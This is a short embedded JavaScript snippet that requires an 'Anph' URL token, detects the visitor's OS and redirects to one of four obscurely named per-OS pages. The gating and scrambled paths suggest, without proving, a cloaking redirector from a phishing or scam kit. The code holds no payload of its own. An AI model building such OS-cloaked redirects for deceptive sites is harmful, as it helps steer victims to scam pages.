<script>
(function () {

    function getParam(name) {
        return new URLSearchParams(window.location.search).get(name) || "";
    }

    function detectOS() {
        const ua = navigator.userAgent.toLowerCase();

        if (ua.includes("android")) return "Android";
        if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
        if (ua.includes("mac")) return "MacOS";
        if (ua.includes("win")) return "Windows";
        return "Other";
    }

    let anph = getParam("Anph");

    if (!anph) {
        document.body.innerHTML = "<h2 style='color:red;text-align:center;'>Missing Anph</h2>";
        return;
    }

    let os = detectOS();
    let path = "";

    if (os === "Android") {
        path = "/andx010usahTml/index.html";
    } else if (os === "iOS") {
        path = "/ioxs010usxhYMl/index.html";
    } else if (os === "MacOS") {
        path = "/MerxiC0deinfousahtml/index.html";
    } else {
        path = "/webC0deinfousavhtml/index.html";
    }

    window.location.replace(path + "?Anph=" + encodeURIComponent(anph));

})();
</script>
